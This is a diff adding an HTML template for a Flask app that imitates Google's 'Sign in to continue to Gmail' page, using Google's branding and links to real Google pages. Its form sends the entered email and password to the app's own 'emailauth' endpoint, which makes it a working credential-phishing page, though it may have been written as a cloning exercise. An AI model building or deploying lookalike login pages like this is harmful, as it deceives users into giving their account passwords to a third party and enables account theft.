@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/styles.css') }}" >
+    <script type = "text/javascript" src="{{ url_for('static', filename='javascript/firstjs.js') }}" ></script>
+    <script type="text/javascript" src="{{ url_for('static', filename='jquery/jquery.js.js') }}"></script>
+    <script type="text/javascript" src="{{ url_for('static', filename='jquery/sample.js') }}"></script>
+    <!--<style>-->
+
+        <!--.imggoogle{-->
+
+        <!--width:50px;-->
+        <!--height:50px;-->
+
+        <!--}-->
+
+    <!--</style>-->
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body class="body">
+<div class="div1">
+    <img class="imggoogle" src="{{ url_for('static', filename='images/google-icon.png') }}">
+<p class="signin"> Sign in</p>
+        <font class="continue">to continue to Gmail</font>
+        <form action="emailauth" method="post">
+        <input type="email" class="input1" id="usern" placeholder="Email or Phone" name="usern" required>
+            <input type="password" class="input1" id="passw" placeholder="password" name="passw" required>
+
+    <p class="forgot"><b><a href="https://accounts.google.com/signin/v2/usernamerecovery?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=AddSession" style="text-decoration:none;color:#1a73e8;"> forgot email?</a></b></p>
+        <pre>Not your computer?use Guest mode to sign in privately.<br><a href="https://support.google.com/chrome/answer/6130773?hl=en-GB" style="text-decoration:none;"><font style="color:#1a73e8;">Learn More</font></a></pre>
+        <br><br><br>
+         <font class="create"><b><a href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&gmb=exp&biz=false" style="text-decoration:none;color:#1a73e8;">Create account</a></b></font>
+    <button id="next" type="submit">Next</button>
+            </form>
+<!--<p id="demo">hello</p>-->
+    <!--<p id="jqsample" style="position:absolute;">happy</p>-->
+
+</div>
+
+<!--<div class="div2">-->
+<!--<img class="imggoogle" src="google-icon.png" >-->
+<!--<p class="head"> hello</p>-->
+<!--</div>-->
+    <!--<div class="div3">-->
+<!--<img class="imggoogle" src="google-icon.png" >-->
+<!--<p class="head"> hello</p>-->
+<!--</div>-->
+<!--</div>-->
+</body>
+</html>
